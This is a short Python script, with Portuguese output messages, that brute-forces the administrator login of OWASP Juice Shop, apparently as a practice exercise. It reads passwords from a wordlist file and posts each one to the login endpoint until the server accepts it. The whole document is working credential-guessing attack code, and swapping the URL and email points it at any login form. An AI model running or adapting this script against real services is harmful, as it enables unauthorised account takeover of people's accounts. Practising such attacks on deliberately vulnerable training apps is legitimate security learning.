import requests

url = "https://juice-shop.herokuapp.com/rest/user/login"
params = {
    "email": "admin@juice-sh.op",
    "password": "",
}

file = open("wordlist-simples.txt", "r")

wordlist = file.readlines()

for index, line in enumerate(wordlist):
    params["password"] = line.rstrip("\n")
    try_login = requests.post(url, data=params)
    if try_login.status_code == 200:
        print("Achei a senha: {}".format(line))
        break
    print("Tentativa: {} Senha invalida: {}".format(index, line))
